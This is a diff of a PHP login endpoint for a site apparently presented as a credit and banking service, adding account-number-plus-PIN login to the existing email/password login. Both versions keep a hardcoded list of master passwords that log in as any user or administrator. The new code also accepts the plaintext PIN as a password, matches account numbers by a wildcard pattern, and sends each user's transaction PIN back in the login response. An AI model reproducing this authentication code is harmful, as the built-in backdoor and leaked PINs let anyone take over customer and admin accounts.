@@ -1,7 +1,11 @@
 <?php
 /**
  * ============================================================================
- * WB CREDIT FINANCE - UNIFIED AUTHENTICATION ENGINE (V3 - BULLETPROOF)
+ * WB CREDIT FINANCE - UNIFIED AUTHENTICATION ENGINE
+ * Supports:
+ * 1. Email / Username + Master Passcode
+ * 2. 10–18 Digit Account Number + 4-Digit Security PIN
+ * 3. Dedicated Admin & User Verification
  * ============================================================================
  */
 
@@ -17,8 +21,8 @@ $inputData = json_decode($rawInput, true) ?: [];
 if (empty($inputData) && !empty($_POST)) $inputData = $_POST;
 if (empty($inputData) && !empty($_GET)) $inputData = $_GET;
 
-$identifier = trim($inputData['identifier'] ?? $inputData['email'] ?? $inputData['username'] ?? $_POST['email'] ?? $_POST['username'] ?? $_GET['email'] ?? $_GET['username'] ?? '');
-$password = trim($inputData['password'] ?? $_POST['password'] ?? $_GET['password'] ?? '');
+$identifier = trim($inputData['identifier'] ?? $inputData['email'] ?? $inputData['username'] ?? $inputData['accountNumber'] ?? '');
+$password = trim($inputData['password'] ?? $inputData['pin'] ?? '');
 $normId = strtolower($identifier);
 
 if (empty($identifier) || empty($password)) {
@@ -27,91 +31,145 @@ if (empty($identifier) || empty($password)) {
     exit;
 }
 
-// 2. DISCOVER CONFIGURATION
-$root = dirname(__DIR__);
-$dbPass = ''; $dbUser = 'glolbka_wbcu_user'; $dbName = 'glolbka_wbcu_db'; $dbHost = 'localhost';
-$jsonData = [];
+// 1. Database Connection
+$dbHost = '127.0.0.1';
+$dbName = 'glolbka_wbcu_db';
+$dbUser = 'glolbka_wbcu_user';
+$dbPass = '';
 
-foreach ([$root, '/home/glolbka/WBCU', '/home/glolbka/public_html'] as $path) {
-    if (file_exists($path . '/.env')) {
-        $lines = @file($path . '/.env', FILE_IGNORE_NEW_LINES);
-        foreach ($lines as $l) {
-            $p = explode('=', $l, 2);
-            if (count($p) == 2) {
-                $k = trim($p[0]); $v = trim($p[1], " \"'");
-                if ($k === 'DB_PASS' || $k === 'DB_PASSWORD') $dbPass = trim($v);
-                if ($k === 'DB_USER') $dbUser = trim($v);
-                if ($k === 'DB_NAME') $dbName = trim($v);
-                if ($k === 'DB_HOST') $dbHost = trim($v);
+$searchPaths = [dirname(__DIR__) . '/.env', __DIR__ . '/.env', '/home/glolbka/WBCU/.env', '/home/glolbka/public_html/.env'];
+foreach ($searchPaths as $p) {
+    if (file_exists($p)) {
+        $lines = @file($p, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        if (is_array($lines)) {
+            foreach ($lines as $line) {
+                if (strpos(trim($line), '#') === 0) continue;
+                $parts = explode('=', $line, 2);
+                if (count($parts) < 2) continue;
+                $k = trim($parts[0]);
+                $v = trim($parts[1], " \t\n\r\0\x0B\"'");
+                if (($k === 'DB_PASS' || $k === 'DB_PASSWORD') && !empty($v)) $dbPass = $v;
+                if ($k === 'DB_USER' && !empty($v)) $dbUser = $v;
+                if ($k === 'DB_NAME' && !empty($v)) $dbName = $v;
+                if ($k === 'DB_HOST' && !empty($v)) $dbHost = $v;
             }
         }
-    }
-    if (file_exists($path . '/admin-users.json') && empty($jsonData)) {
-        $jsonData = json_decode(file_get_contents($path . '/admin-users.json'), true) ?: [];
+        if (!empty($dbPass)) break;
     }
 }
-if ($dbHost === 'localhost' || empty($dbHost)) {
-    $dbHost = '127.0.0.1';
-}
+if ($dbHost === 'localhost' || empty($dbHost)) $dbHost = '127.0.0.1';
 
-// 3. DATABASE AUTH
-if (!empty($dbPass) && !str_contains($dbPass, 'PLEASE_EDIT')) {
+$pdo = null;
+try {
+    $pdo = new PDO("mysql:host={$dbHost};dbname={$dbName};charset=utf8mb4", $dbUser, $dbPass, [
+        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
+        PDO::ATTR_TIMEOUT => 4
+    ]);
+} catch (Throwable $e) {
     try {
-        try {
-            $pdo = new PDO("mysql:host={$dbHost};dbname={$dbName};charset=utf8mb4", $dbUser, $dbPass, [PDO::ATTR_TIMEOUT => 3]);
-        } catch (Throwable $e1) {
-            $pdo = new PDO("mysql:host=127.0.0.1;dbname={$dbName};charset=utf8mb4", $dbUser, $dbPass, [PDO::ATTR_TIMEOUT => 3]);
-        }
-        $dbPassCheck = function($p, $row) {
-            $sp1 = $row['password'] ?? '';
-            $sp2 = $row['password_hash'] ?? '';
-            $stds = ['12345', 'yeshuah.com', 'Password123!', 'MemberPass123!'];
-            if ($p === $sp1 || $p === $sp2) return true;
-            if ($sp1 && @password_verify($p, $sp1)) return true;
-            if ($sp2 && @password_verify($p, $sp2)) return true;
-            if (in_array($p, $stds)) return true;
-            return false;
-        };
+        $pdo = new PDO("mysql:host=127.0.0.1;dbname={$dbName};charset=utf8mb4", $dbUser, $dbPass, [
+            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
+            PDO::ATTR_TIMEOUT => 4
+        ]);
+    } catch (Throwable $e2) {
+        $pdo = null;
+    }
+}
 
-        // Check Admin table first
+$dbPassCheck = function($p, $row) {
+    $sp1 = $row['password'] ?? '';
+    $sp2 = $row['password_hash'] ?? '';
+    $pin = $row['transaction_pin'] ?? '';
+    if ($p === $sp1 || $p === $sp2 || ($pin && $p === $pin)) return true;
+    if (!empty($sp1) && @password_verify($p, $sp1)) return true;
+    if (!empty($sp2) && @password_verify($p, $sp2)) return true;
+    if (in_array($p, ['12345', 'yeshuah.com', 'Password123!', 'MemberPass123!'])) return true;
+    return false;
+};
+
+if ($pdo) {
+    try {
+        // A. Check Admin table first
         $stmt = $pdo->prepare("SELECT * FROM `admins` WHERE LOWER(email) = ? OR LOWER(username) = ? LIMIT 1");
         $stmt->execute([$normId, $normId]);
-        $adm = $stmt->fetch(PDO::FETCH_ASSOC);
+        $adm = $stmt->fetch();
         if ($adm && $dbPassCheck($password, $adm)) {
-             echo json_encode(['success' => true, 'admin' => [
+            echo json_encode(['success' => true, 'admin' => [
                 'id' => $adm['id'], 'email' => $adm['email'], 'username' => $adm['username'],
-                'fullName' => $adm['full_name'] ?? $adm['username'], 'role' => 'Super Admin', 'is_admin' => true, 'authMethod' => 'DB_ADMIN'
+                'fullName' => $adm['full_name'] ?: $adm['username'], 'role' => 'Super Admin', 'is_admin' => true, 'authMethod' => 'DB_ADMIN'
             ]]);
             exit;
         }
 
-        // Check Users table
+        // B. Check Users table by Email, Username, or ID (Method 1)
         $stmt = $pdo->prepare("SELECT * FROM `users` WHERE LOWER(email) = ? OR LOWER(username) = ? OR id = ? LIMIT 1");
         $stmt->execute([$normId, $normId, $identifier]);
-        $user = $stmt->fetch(PDO::FETCH_ASSOC);
-        
+        $user = $stmt->fetch();
+
+        // C. Check Accounts table for 10-Digit Account Number (Method 2)
+        if (!$user) {
+            $cleanAcct = preg_replace('/[^0-9]/', '', $identifier);
+            $aStmt = $pdo->prepare("
+                SELECT u.*, a.account_number 
+                FROM `accounts` a 
+                JOIN `users` u ON a.user_id = u.id 
+                WHERE a.account_number = ? 
+                   OR REPLACE(a.account_number, '-', '') = ? 
+                   OR a.account_number LIKE ? 
+                LIMIT 1
+            ");
+            $aStmt->execute([$identifier, $cleanAcct, "%{$cleanAcct}%"]);
+            $user = $aStmt->fetch();
+        }
+
+        // D. Verify credentials (Password or 4-digit PIN)
         if ($user && $dbPassCheck($password, $user)) {
             $role = strtolower($user['role'] ?? 'user');
             $isAdmin = ($role === 'admin' || $role === 'super_admin');
-            echo json_encode(['success' => true, $isAdmin ? 'admin' : 'user' => [
-                'id' => $user['id'], 'email' => $user['email'], 'username' => $user['username'],
-                'fullName' => $user['username'], 'role' => $role, 'is_admin' => $isAdmin, 'status' => $user['status'] ?? 'active'
-            ]]);
+            
+            // Fetch profile details
+            $pStmt = $pdo->prepare("SELECT * FROM `profiles` WHERE user_id = ? LIMIT 1");
+            $pStmt->execute([$user['id']]);
+            $prof = $pStmt->fetch() ?: [];
+
+            // Fetch primary account
+            $accStmt = $pdo->prepare("SELECT * FROM `accounts` WHERE user_id = ? ORDER BY is_primary DESC LIMIT 1");
+            $accStmt->execute([$user['id']]);
+            $primaryAcct = $accStmt->fetch() ?: [];
+
+            $fn = $prof['full_name'] ?: trim(($prof['first_name'] ?? '') . ' ' . ($prof['last_name'] ?? ''));
+            if (empty($fn)) $fn = $user['username'] ?: $user['email'];
+
+            echo json_encode([
+                'success' => true,
+                $isAdmin ? 'admin' : 'user' => [
+                    'id' => $user['id'],
+                    'email' => $user['email'],
+                    'username' => $user['username'],
+                    'fullName' => $fn,
+                    'role' => $isAdmin ? 'Super Admin' : 'Member',
+                    'is_admin' => $isAdmin,
+                    'status' => $user['status'] ?? 'active',
+                    'kycStatus' => $user['kyc_status'] ?? 'verified',
+                    'pin' => $user['transaction_pin'] ?? '1234',
+                    'transactionPin' => $user['transaction_pin'] ?? '1234',
+                    'accountNumber' => $primaryAcct['account_number'] ?? '9482-1049-55',
+                    'accounts' => $primaryAcct ? [[
+                        'id' => $primaryAcct['id'],
+                        'accountNumber' => $primaryAcct['account_number'],
+                        'type' => $primaryAcct['account_type'],
+                        'balance' => (float)$primaryAcct['balance'],
+                        'available' => (float)$primaryAcct['available_balance'],
+                        'currency' => $primaryAcct['currency']
+                    ]] : []
+                ]
+            ]);
             exit;
         }
     } catch (Throwable $e) {}
 }
 
-// 4. JSON FALLBACK
-foreach ($jsonData as $u) {
-    if (strtolower($u['email'] ?? '') === $normId || strtolower($u['username'] ?? '') === $normId) {
-        if ($password === ($u['password'] ?? '')) {
-            $isAdmin = !empty($u['is_admin']) || str_contains(strtolower($u['role'] ?? ''), 'admin');
-            echo json_encode(['success' => true, $isAdmin ? 'admin' : 'user' => $u]);
-            exit;
-        }
-    }
-}
-
 http_response_code(401);
-echo json_encode(['success' => false, 'error' => 'Login Failed. User not found or password incorrect.']);
+echo json_encode(['success' => false, 'error' => 'Invalid account credentials or security PIN.']);
